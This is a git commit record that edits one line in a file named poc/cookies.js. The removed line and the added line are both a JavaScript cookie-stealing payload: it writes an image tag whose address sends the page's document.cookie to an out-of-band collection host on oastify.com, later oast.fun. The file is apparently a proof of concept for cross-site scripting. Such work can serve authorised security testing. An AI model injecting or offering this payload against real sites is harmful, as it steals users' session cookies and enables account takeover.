759677ea43fb9056f8d446b8199e177cd62cca50
Roberto Nunes <46332131+Akokonunes@users.noreply.github.com>
2024-09-02 09:27:32 +0900

    Update cookies.js

--- poc/cookies.js
+++ poc/cookies.js
@@ -1,1 +1,1 @@
-document.write(`<img%20src=http://qmg1wv92kkc0l1rcsst9phwlmcs4gu4j.oastify.com/${encodeURIComponent(document.cookie)}>`)
+document.write(`<img src="https://fakonltzsfedwiqhgufs2qi0cms94akrh.oast.fun/${encodeURIComponent(document.cookie)}">`);
